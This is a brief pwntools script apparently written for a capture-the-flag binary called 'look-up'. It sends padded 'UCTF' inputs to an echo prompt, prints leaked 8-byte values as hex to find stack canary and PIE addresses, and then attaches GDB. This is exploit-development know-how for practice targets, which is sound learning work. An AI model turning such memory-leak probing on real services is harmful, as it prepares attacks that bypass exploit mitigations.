from pwn import *
 
e = ELF("./look-up")
io = e.process()
#io = remote("look-up.uctf.ir", 5000)
for i in range(30):
        io.recvuntil("--- I'll repeat what you say :D ---\n")
        io.sendline("UCTF"+"A"*i)
        io.recvline()
        try:
          print("%d - %s" % (i, hex(u64(io.recvline().strip().ljust(8, b'\x00')))))
        except:
          continue
# Attach GDB to the running process
gdb.attach(io, gdbscript="""
init-pwndbg
canary
pie
""")
# Keep the process alive to interact with GDB
io.interactive()
